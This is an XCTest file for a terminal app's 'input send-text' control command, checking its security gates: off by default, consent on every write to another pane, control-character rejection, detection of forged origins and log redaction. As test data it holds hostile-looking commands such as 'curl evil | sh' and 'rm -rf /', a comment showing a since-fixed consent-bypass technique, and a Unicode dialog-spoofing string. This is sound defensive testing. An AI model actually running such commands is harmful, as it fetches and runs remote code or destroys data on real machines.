import XCTest
@testable import QuickTerm

/// Phase 4：`input send-text`。
///
/// 这条命令是整个控制面里唯一能让别人的 shell 执行任意命令的原语，所以每一道闸门
/// 都有一条用例钉着，而且**每一条都单独生效**——去掉任意一道，剩下的仍然要拦得住：
/// 默认关闭 · sensitive 类 · 写别人的 pane 每次确认 · 控制字符拒绝 · 换行只能靠 --enter。
@MainActor
final class ControlInputTests: XCTestCase {
    private var harness: ControlHarness!

    override func setUpWithError() throws {
        try super.setUpWithError()
        harness = try ControlHarness()
    }

    override func tearDown() {
        harness?.cleanup()
        harness = nil
        super.tearDown()
    }

    /// 一个**真实**的来源：pane 的 UUID + 那个 pane 自己那一枚 `QUICKTERM_PANE_TOKEN`。
    /// 免确认豁免认的就是后者（前者是自报的，服务端一个字都验不了）
    private func origin(of pane: PaneView) -> ControlRequestOrigin {
        ControlRequestOrigin(pane: pane.id.uuidString, screen: 1, workspace: 1, pid: getpid(),
                             paneToken: ControlEnvironment.paneToken(for: pane.id))
    }

    /// 打开 `[control] send-text`（默认是关的）
    private func enableSendText() {
        var config = ControlCommandRunner.Config()
        config.sendText = true
        harness.runner.config = config
    }

    // MARK: 闸门一：默认关闭

    /// 配置项没打开就一律拒绝，而且**拒在限流与确认之前**：
    /// 一条根本不该执行的命令，连把用户叫起来问一句都不该有
    func testSendTextIsRefusedWhenTheConfigKeyIsOff() throws {
        XCTAssertFalse(ControlCommandRunner.Config().sendText, "[control] send-text 默认必须是 false")
        let pane = try harness.newTerminal()
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let reply = try harness.run("input.send-text",
                                    target: "#\(pane.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.denied.rawValue)
        XCTAssertEqual(reply.error?.exit, ControlExit.denied.rawValue)
        XCTAssertTrue(reply.error?.hint?.contains("send-text = true") ?? false,
                      "拒绝时要说清怎么打开它")
        XCTAssertEqual(prompts, 0, "关着的时候连确认框都不该弹")
    }

    // MARK: 闸门二：安全分级

    /// **命令表是唯一的出处**：`input` 组只要有一条不是 sensitive，
    /// 那条就绕过了 `handle()` 里"默认关闭"的那道闸门（它是按 `cls == .sensitive` 分流的）
    func testSendTextPathCannotBeReachedWithoutTheSensitiveClassCheck() throws {
        let commands = ControlCommandTable.commands(inGroup: "input")
        XCTAssertFalse(commands.isEmpty)
        for spec in commands {
            XCTAssertEqual(spec.cls, .sensitive, "\(spec.cli) 必须是 sensitive 类")
            XCTAssertTrue(spec.cls.requiresConsent, "sensitive 必须落在需要确认的那一侧")
            XCTAssertTrue(spec.cls.isMutation, "sensitive 必须落在变更的那一侧（readonly 模式要拦得住）")
            XCTAssertTrue(spec.acceptsTarget, "\(spec.cli) 必须能被 -t 指到")
            XCTAssertFalse(spec.examples.isEmpty)
        }
        let spec = try XCTUnwrap(ControlCommandTable.command("input.send-text"))
        XCTAssertEqual(spec.cli, "input send-text")
        XCTAssertFalse(spec.idempotent, "打两次字就是打了两次，不是幂等的")
        XCTAssertTrue(spec.summary.contains("默认关闭"), "帮助里必须写明它默认是关的")
        XCTAssertTrue(spec.args.contains { $0.name == "enter" })

        // readonly 模式下也进不来（`sensitive.isMutation == true` 是这条的实现方式）
        enableSendText()
        var config = harness.runner.config
        config.mode = "readonly"
        harness.runner.config = config
        let pane = try harness.newTerminal()
        let reply = try harness.run("input.send-text", target: "#\(pane.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.denied.rawValue)
    }

    // MARK: 闸门三：确认

    /// **写自己那个 pane 免确认，写任何别的 pane 每次都要确认。**
    /// "每次"是字面意思：破坏性命令按 (pid, 类) 缓存一次，send-text 不缓存——
    /// 上一条批准的是 `git status`，下一条可能是 `curl … | sh`
    func testSelfNeedsNoPromptWhileAnyOtherPanePromptsEveryTime() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)

        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let mineOrigin = origin(of: mine)

        // ① 自己那个 pane（带着这个 pane 自己那一枚 pane token）：一次都不问
        for _ in 0..<3 {
            let reply = try harness.run("input.send-text", target: "#\(mine.id.uuidString)",
                                        args: ["text": .string("echo self")],
                                        token: ControlEnvironment.token, origin: mineOrigin)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
        }
        XCTAssertEqual(prompts, 0, "写自己那个 pane 不该弹确认（那个 tty 本来就是调用方自己的）")

        // ② 别的 pane：每一次都问
        for index in 1...3 {
            let reply = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                        args: ["text": .string("echo other")],
                                        token: ControlEnvironment.token, origin: mineOrigin)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
            XCTAssertEqual(prompts, index, "第 \(index) 次写别的 pane 也必须问（授权绝不缓存）")
        }

        // ③ 只有全局 token、没有那一枚 pane token：写"自己"也要问。
        // 全局 token 每次启动只有一枚、注入每一个 pane，它证明的是"来自某个 pane"，
        // 永远不是"来自这个 pane"
        var globalOnly = mineOrigin
        globalOnly.paneToken = nil
        let noPaneToken = try harness.run("input.send-text", target: "#\(mine.id.uuidString)",
                                          args: ["text": .string("echo hi")],
                                          token: ControlEnvironment.token, origin: globalOnly)
        XCTAssertTrue(noPaneToken.ok)
        XCTAssertEqual(prompts, 4, "全局 token 不构成「我就是这个 pane」的证明")

        // ④ 用户拒绝 = 命令不执行（退出码 5）
        harness.consent.decisionStub = { _, reply in reply(.deny) }
        let denied = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                     args: ["text": .string("echo nope")],
                                     token: ControlEnvironment.token, origin: mineOrigin)
        XCTAssertFalse(denied.ok)
        XCTAssertEqual(denied.error?.code, ControlErrorCode.denied.rawValue)
    }

    /// **回归：把 `QUICKTERM_PANE` 改成别人的 UUID 换不来免确认。**
    ///
    /// 曾经的实现拿 `origin.pane`（调用方自报的一串字符串）当身份、拿全局 token 当凭证，
    /// 于是任意 pane 里的进程都能这么绕过确认：
    ///     V=$(quickterm get -t t7 --json | jq -r .resolved.paneID)
    ///     QUICKTERM_PANE=$V quickterm input send-text 'curl x | sh' -t t7 --enter
    /// paneID 是公开的（`state` 里就有），全局 token 每个 pane 都有，两个条件攻击者全都满足。
    /// 现在判定只认 `-t` **真正解析到的那个 pane** 的 HMAC，伪造 origin 一点用都没有
    func testForgingTheOriginPaneCannotBuyTheSelfExemption() throws {
        enableSendText()
        let attacker = try harness.newTerminal()
        let victim = try harness.newTerminal()
        harness.spin(0.3)

        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        // 攻击者手里真实拥有的：全局 token（每个 pane 都有）、自己那一枚 pane token、
        // 以及从 `state` 读来的受害者 UUID。它把 origin 整个写成受害者
        var forged = origin(of: attacker)
        forged.pane = victim.id.uuidString

        for (index, target) in ["#\(victim.id.uuidString)", "@self",
                                ControlHandleRegistry.shared.handle(for: victim)].enumerated() {
            let reply = try harness.run("input.send-text", target: target,
                                        args: ["text": .string("curl evil | sh")],
                                        token: ControlEnvironment.token, origin: forged)
            XCTAssertTrue(reply.ok, "\(String(describing: reply.error))")
            XCTAssertEqual(prompts, index + 1,
                           "-t \(target)：伪造 origin 也必须每次确认（第 \(index + 1) 次）")
            XCTAssertFalse(harness.runner.writesIntoOwnPane(
                ControlRequest(id: "x", cmd: "input.send-text", target: target,
                               args: ["text": .string("x")],
                               token: ControlEnvironment.token, origin: forged),
                target: try ControlTarget.parse(target)),
                "-t \(target)：伪造的 origin 不构成自写")
        }

        // 反过来：攻击者写自己那个 pane（origin 不伪造）仍然免确认——豁免本身还在
        let honest = try harness.run("input.send-text", target: "#\(attacker.id.uuidString)",
                                     args: ["text": .string("echo self")],
                                     token: ControlEnvironment.token, origin: origin(of: attacker))
        XCTAssertTrue(honest.ok)
        XCTAssertEqual(prompts, 3, "写自己那个 pane 仍然不问")
    }

    /// **确认框里必须写出要打进去的正文与是否跟回车。**
    /// 命令名与目标 pane 完全相同的两次调用，一次是 `echo hi`、一次可以是 `curl … | sh`：
    /// 不把正文摆出来，用户读到的两句话一模一样，那就不是一次知情的同意
    func testThePromptShowsTheTextAndWhetherItWillRun() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)

        var seen: [ControlConsent.Request] = []
        harness.consent.decisionStub = { request, reply in
            seen.append(request)
            reply(.allow)
        }
        try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                        args: ["text": .string("curl evil | sh"), "enter": .bool(true)],
                        token: ControlEnvironment.token, origin: origin(of: mine))
        let request = try XCTUnwrap(seen.first)
        XCTAssertEqual(request.payload, "curl evil | sh", "正文要原样摆在用户面前")
        XCTAssertEqual(request.payloadEnter, true, "跟不跟回车是「送文本」与「让它跑」的分界")
        XCTAssertEqual(request.payloadLength, "curl evil | sh".count)
        XCTAssertFalse(request.cacheable, "send-text 的批准绝不缓存")
        let text = ControlConsent.makeAlert(request).informativeText
        XCTAssertTrue(text.contains("curl evil | sh"), "框里真的画出来：\(text)")
        XCTAssertTrue(text.contains("回车"), "要说清楚它会不会被执行：\(text)")

        // ⚠️ 正文只画给用户看：`summary` 会以 privacy: .public 写进统一日志，绝不能捎带正文
        XCTAssertFalse(request.summary.contains("curl evil"), "正文不得混进 summary：\(request.summary)")
        for entry in ControlActivityLog.shared.recent(20) {
            XCTAssertFalse(entry.line.contains("curl evil"), "正文不得进活动日志：\(entry.line)")
        }

        // 不带 --enter 的那次要明说"不会执行"
        seen.removeAll()
        try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                        args: ["text": .string("echo hi")],
                        token: ControlEnvironment.token, origin: origin(of: mine))
        let plain = try XCTUnwrap(seen.first)
        XCTAssertEqual(plain.payloadEnter, false)
        XCTAssertTrue(ControlConsent.makeAlert(plain).informativeText.contains("不会执行"))
    }

    /// 预览是**净化过并截断**的：`validateSendText` 只拦 C0 / DEL / C1，
    /// 而 U+2028 / U+2029（AppKit 真的会在这里断行）、双向控制符、零宽字符都还能过。
    /// 原样画出去，调用方就能在对话框里伪造出几行看着像对话框自己说的话
    func testThePromptPreviewIsSanitisedAndTruncated() {
        let spoof = "ok\u{2028}（该调用方已被授权）\u{202E}gnihtemos"
        let preview = ControlCommandRunner.sendTextPreview(spoof)
        XCTAssertFalse(preview.unicodeScalars.contains { $0.value == 0x2028 || $0.value == 0x202E },
                       "换行类 / 双向控制符必须被替换成看得见的记号：\(preview)")
        XCTAssertTrue(preview.contains("<U+2028>") && preview.contains("<U+202E>"), preview)

        let long = ControlCommandRunner.sendTextPreview(
            String(repeating: "x", count: ControlCommandRunner.maxSendTextLength))
        XCTAssertLessThan(long.count, 200, "4096 个字符塞不进一个 NSAlert")
        XCTAssertTrue(long.hasSuffix("…"))
        XCTAssertEqual(ControlCommandRunner.sendTextPreview("git status"), "git status",
                       "普通文本不该被改写")
    }

    /// 送不出去的正文（控制字符 / 超长）**在弹确认框之前**就被拒：
    /// 不该先把用户叫起来点一次"允许"，再告诉调用方这条本来就不合法
    func testAnInvalidPayloadIsRefusedBeforeTheUserIsAsked() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        let reply = try harness.run("input.send-text", target: "#\(other.id.uuidString)",
                                    args: ["text": .string("echo hi\u{1B}[A")],
                                    token: ControlEnvironment.token, origin: origin(of: mine))
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.badRequest.rawValue)
        XCTAssertEqual(prompts, 0, "不合法的正文不该惊动用户")
    }

    /// 免确认判定是**身份比对**，不是拼写比对：`-t @self` 与 `-t <自己的句柄>` 一视同仁，
    /// 而写别人的句柄一律不豁免
    func testSelfExemptionComparesPaneIdentityNotSpelling() throws {
        enableSendText()
        let mine = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        let mineOrigin = origin(of: mine)
        let request = { (target: String) in
            ControlRequest(id: "x", cmd: "input.send-text", target: target,
                           args: ["text": .string("echo hi")],
                           token: ControlEnvironment.token, origin: mineOrigin)
        }
        XCTAssertTrue(harness.runner.writesIntoOwnPane(request("@self"),
                                                       target: try ControlTarget.parse("@self")))
        let mineHandle = ControlHandleRegistry.shared.handle(for: mine)
        XCTAssertTrue(harness.runner.writesIntoOwnPane(request(mineHandle),
                                                       target: try ControlTarget.parse(mineHandle)),
                      "写自己的句柄与写 @self 是同一件事")
        let otherHandle = ControlHandleRegistry.shared.handle(for: other)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(request(otherHandle),
                                                        target: try ControlTarget.parse(otherHandle)))
        // pane token 不对：一律不豁免（全局 token 再正确也没用）
        var forged = request("@self")
        forged.origin?.paneToken = String(repeating: "0", count: 64)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
        forged.origin?.paneToken = nil
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
        // 拿的是**别人**那一枚：同样不豁免（它对得上的是别人的 pane）
        forged.origin?.paneToken = ControlEnvironment.paneToken(for: other.id)
        XCTAssertFalse(harness.runner.writesIntoOwnPane(forged, target: try ControlTarget.parse("@self")))
    }

    // MARK: 闸门四：控制字符与换行

    /// 控制字符**一律拒绝**，而且是拒绝不是过滤：
    /// 悄悄剥掉一个字符会让调用方以为送出去的是它写的那一串，而到达 shell 的是另一串
    func testControlCharactersAreRejected() throws {
        for bad in ["echo hi\n", "echo hi\r", "a\tb", "\u{1B}[A", "\u{03}", "x\u{7F}", "a\u{85}b"] {
            XCTAssertThrowsError(try ControlCommandRunner.validateSendText(bad),
                                 "控制字符必须被拒绝：\(bad.debugDescription)") { error in
                let body = error as? ControlErrorBody
                XCTAssertEqual(body?.code, ControlErrorCode.badRequest.rawValue)
                XCTAssertNotNil(body?.hint)
            }
        }
        // 可见文本（含中文、emoji、引号）照过
        for good in ["git status", "echo '你好'", "ls -la ~/proj", "printf %s 🚀"] {
            XCTAssertNoThrow(try ControlCommandRunner.validateSendText(good))
        }
        // 上限
        XCTAssertThrowsError(try ControlCommandRunner.validateSendText(
            String(repeating: "x", count: ControlCommandRunner.maxSendTextLength + 1)))
    }

    /// **`--enter` 是送出换行的唯一方式**，也就是"让 shell 真的执行它"的唯一方式。
    /// 没有这一条，一次"只是想填个输入框"的调用会顺手把命令执行掉
    func testEnterIsTheOnlyWayToSendANewline() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let paneOrigin = origin(of: pane)
        let target = "#\(pane.id.uuidString)"

        // 正文里写 \n 一律被拒
        let newline = try harness.run("input.send-text", target: target,
                                      args: ["text": .string("echo hi\n")],
                                      token: ControlEnvironment.token, origin: paneOrigin)
        XCTAssertFalse(newline.ok)
        XCTAssertEqual(newline.error?.code, ControlErrorCode.badRequest.rawValue)
        XCTAssertTrue(newline.error?.hint?.contains("--enter") ?? false,
                      "被拒时要指路到 --enter：那是让它执行的唯一方式")

        // 不给 --enter：送文本，不回车
        let plain = try harness.mutation(try harness.run(
            "input.send-text", target: target, args: ["text": .string("echo hi")],
            token: ControlEnvironment.token, origin: paneOrigin))
        XCTAssertEqual(plain["applied"]?.boolValue, true)
        let plainDiff = try XCTUnwrap(plain["changes"]?.arrayValue?.first?.objectValue?["to"]?.stringValue)
        XCTAssertTrue(plainDiff.contains("无回车"), "不给 --enter 就明确写出没有回车：\(plainDiff)")

        // 给了 --enter：diff 里说清楚多送了一个回车
        let entered = try harness.mutation(try harness.run(
            "input.send-text", target: target,
            args: ["text": .string("echo hi"), "enter": .bool(true)],
            token: ControlEnvironment.token, origin: paneOrigin))
        let enterDiff = try XCTUnwrap(entered["changes"]?.arrayValue?.first?.objectValue?["to"]?.stringValue)
        XCTAssertTrue(enterDiff.contains("回车"), "\(enterDiff)")
        XCTAssertFalse(enterDiff.contains("无回车"))
    }

    // MARK: 其它不变量

    /// `--dry-run` 一个字符都不送，而且**因此也不问**（确认框问的是"要不要动手"）
    func testDryRunSendsNothingAndDoesNotPrompt() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        let other = try harness.newTerminal()
        harness.spin(0.3)
        var prompts = 0
        harness.consent.decisionStub = { _, reply in
            prompts += 1
            reply(.allow)
        }
        _ = pane
        let data = try harness.mutation(try harness.run(
            "input.send-text", target: "#\(other.id.uuidString)",
            args: ["text": .string("rm -rf /"), ControlCommandTable.Flag.dryRun: .bool(true)]))
        XCTAssertEqual(data["applied"]?.boolValue, false, "预演绝不能真的落刀")
        XCTAssertEqual(data["dryRun"]?.boolValue, true)
        XCTAssertEqual(prompts, 0, "预演什么都不改，所以不必问")
    }

    /// 目标必须显式写出来。别处的默认落点是"焦点 pane"，在这里那等于
    /// "往此刻碰巧被聚焦的那个 shell 里打字"——agent 看不见焦点
    func testAnExplicitTargetIsRequired() throws {
        enableSendText()
        try harness.newTerminal()
        harness.spin(0.3)
        let reply = try harness.run("input.send-text", args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.badTarget.rawValue)
        XCTAssertTrue(reply.error?.hint?.contains("@self") ?? false)
    }

    /// 浏览器 pane 没有 tty：明确报 wrong_pane_kind，而不是静默什么都不做
    func testBrowserPanesCannotReceiveText() throws {
        enableSendText()
        let controller = try harness.controller
        let before = Set(controller.model.allPanes.map(\.id))
        controller.perform(.newBrowser)
        harness.spin(0.5)
        guard let browser = controller.model.allPanes.first(where: { !before.contains($0.id) })
        else { throw XCTSkip("没能建出浏览器 pane") }
        harness.track(browser)

        let reply = try harness.run("input.send-text", target: "#\(browser.id.uuidString)",
                                    args: ["text": .string("echo hi")])
        XCTAssertFalse(reply.ok)
        XCTAssertEqual(reply.error?.code, ControlErrorCode.wrongPaneKind.rawValue)
    }

    /// 送进去的正文**绝不进日志**：活动日志是长期留存的，而正文往往就是命令行本身
    func testTheTextItselfNeverReachesTheActivityLog() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let secret = "export TOKEN=sk-do-not-log-me"
        let paneOrigin = origin(of: pane)
        try harness.run("input.send-text", target: "#\(pane.id.uuidString)",
                        args: ["text": .string(secret)],
                        token: ControlEnvironment.token, origin: paneOrigin)
        for entry in ControlActivityLog.shared.recent(20) {
            XCTAssertFalse(entry.line.contains("sk-do-not-log-me"),
                           "日志里只写字符数，绝不写正文：\(entry.line)")
        }
        XCTAssertTrue(ControlActivityLog.shared.recent(20).contains { $0.command == "input.send-text" },
                      "但这条命令本身必须留下痕迹——静默执行的前提是事后可见")
    }

    /// 打进 shell 的字**不可撤销**：登记一个撤销项只会让用户以为 ⌘Z 能把命令收回来
    func testSendTextIsNotUndoable() throws {
        enableSendText()
        let pane = try harness.newTerminal()
        harness.spin(0.3)
        let paneOrigin = origin(of: pane)
        let data = try harness.mutation(try harness.run(
            "input.send-text", target: "#\(pane.id.uuidString)",
            args: ["text": .string("echo hi")],
            token: ControlEnvironment.token, origin: paneOrigin))
        XCTAssertNil(data["undo"]?.stringValue, "send-text 不该登记撤销")
    }
}
